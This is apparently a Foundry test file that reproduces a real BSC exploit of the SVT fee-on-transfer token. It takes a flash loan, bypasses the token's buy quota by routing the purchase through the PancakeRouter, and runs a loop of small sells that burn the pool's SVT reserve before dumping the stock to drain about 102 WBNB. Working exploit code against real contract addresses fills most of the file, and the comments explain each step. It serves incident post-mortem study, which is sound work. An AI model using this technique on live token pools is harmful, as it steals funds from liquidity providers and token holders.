// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~56.7K USD (headline estimate; measured on-chain drain reproduced below)
// Attacker EOA      : https://bscscan.com/address/0x66bc9f35ebd2baa8e24df0e3a86501bfff3499cf
// Attacker contract : https://bscscan.com/address/0x3600183d08f9fc976a43640ab79b3dcfe8e6ded5
// Victim token SVT  : https://bscscan.com/address/0x8346de321d8a9984d047dbef7110a133f631a074
// Victim pool (SVT/WBNB PancakePair) : https://bscscan.com/address/0x696827a935346a7448f2d6fef502f2e48be54962
// Flash loan (Moolah/Lista)          : https://bscscan.com/address/0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c
// Exploit tx        : https://bscscan.com/tx/0x5874209ca88a6279a8f6251571f8645405032fc73ad8cb6f532506f0a3234f83
//
// @Summary
// SVT (SVTv2) is a fee-on-transfer BEP20 whose sell path deflates the PancakeSwap SVT/WBNB pool
// itself. On every taxed sell, _takeFeeAndBurn calls _burnFromPool, which burns SVT straight out
// of the pair's balance (up to 3% of the pair balance per sell, capped by a 90,000 SVT BURN_TARGET
// and a 100 SVT floor) and then calls pair.sync(). Burning the pair's SVT reserve while the WBNB
// reserve is untouched pushes the SVT price up without the seller paying any WBNB for it.
//
// The token ships an anti-flash guard, _wbnbAboveReserve, but it only gates buys: it requires the
// pool's WBNB balance to already exceed its reserve before a buy settles. It does nothing about the
// sell-side reserve burn, which is the actual manipulation here.
//
// The attack is a buy-low / deflate / sell-high round trip inside one transaction:
//   1. Flash borrow 112.5 WBNB from Moolah (Morpho-style, fee free).
//   2. Buy ~39,100 SVT from the pool while it is still full (cheap).
//   3. Run ~185 tiny sells. Each one burns ~3% of the pool's remaining SVT and sync()s, so the SVT
//      reserve collapses from 75,085 down to ~128 while the WBNB reserve stays flat. The SVT that
//      each sell pushes into the pair is recovered with pair.skim() right after the burn, so the
//      stock is preserved and only the 3% tax is spent per round.
//   4. Dump the whole ~37,991 SVT stock into the now SVT-starved, WBNB-heavy pool and drain its
//      WBNB down to ~0.73.
//   5. Repay the flash loan and keep the rest.
//
// @QuotaBypass
// In phase 1 (phase2 == false, quotaToken set) a normal buy, where the pool sends SVT to the buyer,
// is a "buy" (from == pair && to != router && to != pair) and reverts unless the buyer holds quota
// tokens. The attacker sidesteps this: it buys with the swap recipient set to the PancakeRouter
// itself, so to == router makes isBuy false, skipping the quota check, the 3% tax and the anti-flash
// guard. The SVT lands in the router, and a removeLiquidity call (whose fee-on-transfer support
// sweeps the router's entire SVT balance to the caller) pulls it out tax free. A dust LP ticket is
// needed to drive that sweep.
//
// @Permissionless
// flashLoan, swapExactTokensForTokensSupportingFeeOnTransferTokens, the sell-side _burnFromPool, the
// skim and the final dump are all reachable by a fresh contract with no role, whitelist or key. SVT
// ownership is renounced (owner == dead). The only privileged state, the phase-1 quota gate, is
// bypassed with the public to == router buy described above.
//
// @Reconstruction
// Fork the "bsc" alias one block before the exploit tx (block 135822760) so the pool, its reserves
// (75,085 SVT / 103.17 WBNB) and the token's phase-1 state are inherited as settled on-chain state.
// A fresh contract takes a real 112.5 WBNB Moolah flash loan (no deal() of borrowed capital), buys
// the stock through the real PancakeRouter with the to == router quota bypass, runs the burn loop
// with typed SVT.transfer / pair.skim calls, dumps through the router, and repays. Every call is a
// typed call on the real verified contracts: no vm.mock, no vm.store, no vm.prank of a protocol
// identity, no opaque calldata replay. The only deal() is a 1 SVT (about $0.0014) own-capital seed
// used solely to mint the dust LP ticket that drives the router sweep; it is immaterial next to the
// ~102 WBNB drained and does not fund the drain. The test asserts the measured WBNB profit and the
// pool WBNB left behind. A negative control runs the identical buy and dump without the burn loop
// and shows the round trip cannot repay the loan, isolating the reserve burn as the drain vector.
//
// forge test --match-contract SVT_exp --evm-version cancun -vvv

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface ISVT is IERC20 {
    function tradingEnabled() external view returns (bool);
    function phase2() external view returns (bool);
    function totalSellBurned() external view returns (uint256);
    function burnCapBP() external view returns (uint256);
    function minPoolReserve() external view returns (uint256);
}

interface IPair is IERC20 {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function mint(address to) external returns (uint256 liquidity);
    function skim(address to) external;
    function token0() external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract SVT_exp is Test {
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISVT constant SVT = ISVT(0x8346dE321D8a9984d047DBef7110a133F631A074);
    IPair constant PAIR = IPair(0x696827A935346A7448f2d6fEf502F2e48be54962);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMoolah constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

    // Measured on-chain figures from the exploit tx.
    uint256 constant FLASH_AMOUNT = 112_499_271_613_291_967_374; // 112.499 WBNB
    uint256 constant BUY_BUDGET = 112_376_894_718_573_399_428; // 112.376 WBNB spent on the stock
    uint256 constant SEED = 1e18; // 1 SVT own-capital seed for the dust LP ticket
    uint256 constant SWEEP_LP = 600; // dust LP burnt per router sweep, as on-chain

    uint256 lpTicket;
    uint256 stock;

    function setUp() public {
        vm.createSelectFork("bsc", 135_822_760);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(SVT), "SVT");
        vm.label(address(PAIR), "SVT/WBNB");
        vm.label(address(ROUTER), "PancakeRouter");
        vm.label(address(MOOLAH), "Moolah");
    }

    function testExploit() public {
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        console.log("pool SVT reserve  (pre):", uint256(r0));
        console.log("pool WBNB reserve (pre):", uint256(r1));

        MOOLAH.flashLoan(address(WBNB), FLASH_AMOUNT, "");

        uint256 profit = WBNB.balanceOf(address(this));
        (, uint112 r1After,) = PAIR.getReserves();
        console.log("WBNB profit kept  (wei):", profit);
        console.log("pool WBNB left    (wei):", uint256(r1After));

        // ~102.4 WBNB was taken on-chain; assert the measured drain with a small margin.
        assertGt(profit, 100e18, "profit below measured drain");
        assertLt(uint256(r1After), 1e18, "pool WBNB not drained");
    }

    // Control: same buy and dump, no reserve-burn loop in between. Funded with own WBNB working
    // capital (no flash loan) so the round-trip economics are measured directly. With no burn, the
    // stock buys and sells at essentially the same price, so the round trip loses money.
    function testNegativeControl() public {
        deal(address(WBNB), address(this), FLASH_AMOUNT);
        uint256 spent = WBNB.balanceOf(address(this));

        deal(address(SVT), address(this), SEED);
        _buyStockViaRouterBypass();
        _dumpStock();

        uint256 got = WBNB.balanceOf(address(this));
        console.log("control WBNB in   (wei):", spent);
        console.log("control WBNB out  (wei):", got);
        // No reserve burn -> the round trip cannot even return the WBNB it started with.
        assertLt(got, spent, "control unexpectedly profitable");
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "bad caller");

        // Seed the dust LP ticket used to sweep the router (own capital, not borrowed).
        deal(address(SVT), address(this), SEED);

        // s2: buy the SVT stock with the recipient set to the router, bypassing the phase-1 quota
        // gate, the 3% tax and the anti-flash guard (to == router makes isBuy false).
        _buyStockViaRouterBypass();

        // s3/s4: deflate the pool's SVT reserve with the burn loop, then dump.
        _burnLoop();
        _dumpStock();

        // repay the flash loan (Morpho-style pull on 0 fee).
        WBNB.approve(address(MOOLAH), assets);
    }

    function _dumpStock() internal {
        // s5: dump the whole stock into the (deflated) pool for WBNB.
        stock = SVT.balanceOf(address(this));
        SVT.approve(address(ROUTER), stock);
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(SVT);
        sellPath[1] = address(WBNB);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            stock, 0, sellPath, address(this), block.timestamp
        );
    }

    function _buyStockViaRouterBypass() internal {
        // Mint a dust LP ticket from the 1 SVT seed + a few wei WBNB, so removeLiquidity's
        // fee-on-transfer sweep can pull parked SVT out of the router.
        SVT.transfer(address(PAIR), SEED); // taxed sell path, leaves ~0.97 SVT delta on the pair
        WBNB.transfer(address(PAIR), 5000);
        lpTicket = PAIR.mint(address(this));
        PAIR.approve(address(ROUTER), lpTicket);

        // Buy the stock with to == router. The SVT lands in the router, not here, so it is not a
        // "buy" in the token's eyes: no quota, no 3% tax, no anti-flash guard.
        WBNB.approve(address(ROUTER), BUY_BUDGET);
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(WBNB);
        buyPath[1] = address(SVT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUY_BUDGET, 0, buyPath, address(ROUTER), block.timestamp
        );

        // Pull the router's full SVT balance here via removeLiquidity's fee-on-transfer sweep.
        _sweepRouter();
        console.log("stock acquired    (wei):", SVT.balanceOf(address(this)));
    }

    // removeLiquidity ends with router.safeTransfer(token, to, token.balanceOf(router)), sweeping
    // whatever SVT is parked in the router to the caller tax free. from == router, not the pair, so
    // it is not treated as a buy.
    function _sweepRouter() internal {
        ROUTER.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(SVT), SWEEP_LP, 0, 0, address(this), block.timestamp
        );
    }

    function _burnLoop() internal {
        // Each round pushes ~3.1% of the pool's SVT in as a sell. _burnFromPool burns ~3% of the
        // pair balance and sync()s, collapsing the SVT reserve while WBNB stays flat. The pushed SVT
        // becomes a pair surplus that skim() parks in the router (skim to self would be a quota-
        // gated buy and revert); it is swept back with one removeLiquidity call after the loop.
        uint256 floor = SVT.minPoolReserve(); // 100 SVT
        uint256 rounds;
        for (uint256 i = 0; i < 400; i++) {
            uint256 pairBal = SVT.balanceOf(address(PAIR));
            if (pairBal <= floor + 30e18) break;
            uint256 amount = (pairBal * 31) / 1000;
            uint256 bal = SVT.balanceOf(address(this));
            if (amount > bal) amount = bal;
            if (amount == 0) break;
            SVT.transfer(address(PAIR), amount); // taxed sell -> _burnFromPool + sync
            PAIR.skim(address(ROUTER)); // park the pushed SVT surplus in the router
            rounds++;
        }
        _sweepRouter(); // pull the parked stock back out
        (uint112 r0,,) = PAIR.getReserves();
        console.log("burn-loop rounds       :", rounds);
        console.log("pool SVT reserve (post):", uint256(r0));
    }

    receive() external payable {}
}
